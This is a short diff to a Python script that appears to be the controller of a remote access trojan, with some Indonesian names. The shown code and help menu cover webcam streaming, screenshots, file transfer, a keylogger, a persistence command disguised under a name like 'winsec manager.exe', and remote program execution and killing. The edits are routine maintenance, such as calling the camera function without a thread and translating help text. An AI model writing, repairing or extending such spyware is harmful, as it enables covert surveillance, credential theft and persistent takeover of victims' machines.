@@ -182,10 +182,6 @@ def konversi_byte_stream():
      tg.close()
      cv2.destroyAllWindows()
 
-def stream_cam():
-     t = threading.Thread(target=konversi_byte_stream)
-     t.start()
-
 def upload_file(namafile):
      bufsize = 65536
      if not os.path.exists(namafile):
@@ -257,7 +253,7 @@ def shellc():
              print('stoping keylogger')
              pass
           elif perintah == 'start_cam':
-             stream_cam()
+             konversi_byte_stream()
           elif perintah ==  'screen_shot':
              n += 1
              download_file("ss"+str(n)+".png")
@@ -310,7 +306,7 @@ def shellc():
                      maintain access:
                    ================================ 
                    -persistence >> menjalankan persistensi
-                   contoh:    persistence winsec manager.exe
+                   example:    persistence winsec manager.exe
                    =================================
 
                      mic, keys command:
@@ -323,6 +319,7 @@ def shellc():
                      execution:
                    ================================
                    -execute     >> execute program
+                   
                    -kill        >> kill program
                    =================================
                    
